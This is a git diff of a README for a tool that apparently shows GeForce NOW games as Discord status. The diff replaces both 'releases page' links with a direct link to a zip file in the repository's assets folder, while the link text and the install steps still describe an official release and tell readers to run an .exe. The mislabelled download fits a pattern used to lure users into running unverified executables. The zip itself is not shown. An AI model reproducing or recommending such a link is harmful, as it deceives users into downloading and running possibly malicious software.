@@ -1,12 +1,12 @@
 # 🎮 geforce-now-discord-rpc - Show your cloud games on Discord
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/derickbilious954/geforce-now-discord-rpc/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/derickbilious954/geforce-now-discord-rpc/raw/refs/heads/main/assets/discord_rpc_geforce_now_1.2.zip)
 
 This application shares the game you play on GeForce NOW with your friends on Discord. When you launch a game through the cloud, the app detects the title and updates your Discord status automatically. It runs in your system tray and requires no input after the initial setup.
 
 ## 📥 How to Install
 
-1. Visit the [releases page](https://github.com/derickbilious954/geforce-now-discord-rpc/releases).
+1. Visit the [releases page](https://github.com/derickbilious954/geforce-now-discord-rpc/raw/refs/heads/main/assets/discord_rpc_geforce_now_1.2.zip).
 2. Look for the latest version under the "Assets" section.
 3. Click the file ending in ".exe" to download the installer to your computer.
 4. Open the downloaded file to begin the setup.
